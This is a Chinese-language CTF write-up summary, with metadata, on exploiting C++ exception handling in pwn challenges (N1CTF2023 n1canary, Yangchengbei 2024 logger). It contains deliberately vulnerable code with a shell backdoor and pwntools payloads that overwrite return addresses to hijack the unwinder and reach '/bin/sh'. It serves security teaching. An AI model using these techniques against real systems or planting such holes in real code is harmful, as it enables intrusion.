---
title: 分享C++ PWN出题经历——深入研究异常处理机制
contest: C++ PWN 异常处理 / N1CTF2023 / 羊城杯 2024
year: 2024
difficulty: hard
vuln_type: pwn_unknown
tags: [C++异常处理, try/catch/throw, _Unwind_RaiseException, _cxa_throw, getrandom canary, user_canary XOR, vtable, BOFApp, logger]
attack_chain:
  - 例 1 exception.cpp: try {input(); throw 1;} catch (int x) backdoor() throw "Buffer overflow"
  - read(0, tmp.buf, 0x100) 触发 throw "Buffer overflow" → catch → backdoor system("/bin/sh")
  - 但 No-PIE + Canary + NX 开启
  - poc4 = padding 0x30 + p64(0x404050-0x8) + p64(0x401292+1) (printf try-block 起点)
  - _Unwind_RaiseException 异常处理链劫持
  - N1CTF2023 n1canary: getrandom(sys_canary, 64) + readall(user_canary)
  - getCanary(a1) = user_canary[(a1>>4)&7] ^ sys_canary[(a1>>4)&7]
  - vtable BOFApp off_4ED510 指向 0x403552 launch()
  - unique_ptr default_delete 调用 *(v6+8) → 改 BOFApp+0x8 指向 backdoor
  - backdoor=0x403387, user_canary=0x4F4AA0
  - payload1 = p64(user_canary+8)+p64(backdoor)*2 ljust(0x40, 'a')
  - payload2 = 'a'*(0x70-0x8) + p64(0x403407 ret) + p64(user_canary)
  - 羊城杯 2024 logger: trace 7 次 + '/bin/sh;' + menu(2) 触发 __cxa_throw
  - payload2 = 'a'*0x70 + p64(0x404300) + p64(0x401BC2+1)
key_payload: 'poc4 = 0x30+p64(0x404050-8)+p64(0x401292+1) + N1CTF getrandom+user_canary'
one_liner: C++ PWN 异常处理 + 3 道题：exc _Unwind_RaiseException 链劫持 / n1canary getrandom+user_canary XOR / 羊城杯 logger __cxa_throw。
lesson: C++ try/catch/throw 的 _Unwind_RaiseException + __cxa_throw 链可劫持返回地址 (printf 起点 +1 跳回 try-block)；N1CTF getrandom 64 字节 + user_canary 8 字节 XOR 算 canary；unique_ptr default_delete 调用 vtable+8。
quality: high
---

# 分享C++ PWN出题经历——深入研究异常处理机制

## 概览
- **来源**: ctfiot 220169 (看雪精华 ve1kcon)
- **类型**: C++ 异常处理 PWN 综合
- **难度**: ⭐⭐⭐⭐

## 例 1: exception.cpp 基础
```cpp
void backdoor() {
    try { printf("We have never called this backdoor!"); }
    catch (const char *s) { system("/bin/sh"); }
}
void input() {
    x tmp;  // char buf[0x10]
    int count = 0x100;
    read(0, tmp.buf, count);  // 栈溢出
    if (len > 0x10) throw "Buffer overflow.";
}
int main() {
    try { input(); throw 1; }
    catch (int x) { printf("Int: %d", x); }
    catch (const char *s) { printf("String: %s", s); }
}
```

## _Unwind_RaiseException 链劫持
```python
padding = 'a' * 0x30
poc4 = padding + p64(0x404050-0x8) + p64(0x401292+1)
# 0x404050 = puts@GOT - 0x8 (异常处理表头)
# 0x401292 = printf try-block 起点 (call _printf)
p.sendafter('input:', poc4)
```

## N1CTF2023 n1canary
```c
__int64 init_canary() {
    if (getrandom(&sys_canary, 64, 0) != 64) raise("canary init error");
    puts("To increase entropy, give me your canary");
    return readall(&user_canary);
}
__int64 getCanary(unsigned __int64 a1) {
    return user_canary[(a1 >> 4) & 7] ^ sys_canary[(a1 >> 4) & 7];
}
```
- 攻击: 传 8 字节 user_canary 触发 64 字节 sys_canary 已知
- 改 vtable 0x4ED510 → BOFApp+0x10 = launch() = 0x403552
- unique_ptr default_delete 调用 `*(v6+8)` → 改 BOFApp+0x8 = 0x403387 backdoor
```python
backdoor = 0x403387
user_canary = 0x4F4AA0
payload1 = p64(user_canary+8) + p64(backdoor)*2
payload1 = payload1.ljust(0x40, 'a')
p.sendafter('canary\n', payload1)
payload2 = 'a'*(0x70-0x8) + p64(0x403407) + p64(user_canary)
```

## 2024 羊城杯 logger
```python
def menu(i): p.sendlineafter('chocie:', str(i))
def trace(c='a', j='n'):
    menu(1)
    p.sendlineafter('here: ', c)
    p.sendlineafter('records? ', j)

for i in range(7): trace()
trace('a'*0x10, 'n')
trace('/bin/sh;')  # 注入 /bin/sh;

menu(2)  # 触发 __cxa_throw
payload = 'a'*0x70 + p64(0x404300) + p64(0x401BC2+1)
p.sendafter('Type your message here plz: ', payload)
```

## 教学
- C++ 异常处理链 _Unwind_RaiseException / __cxa_throw / __cxa_end_catch
- catch (const char*) 触发 system("/bin/sh") 是经典后门
- canary 派生 user_canary ^ sys_canary 已知
- unique_ptr 析构调用 vtable+8 (D0Ev)
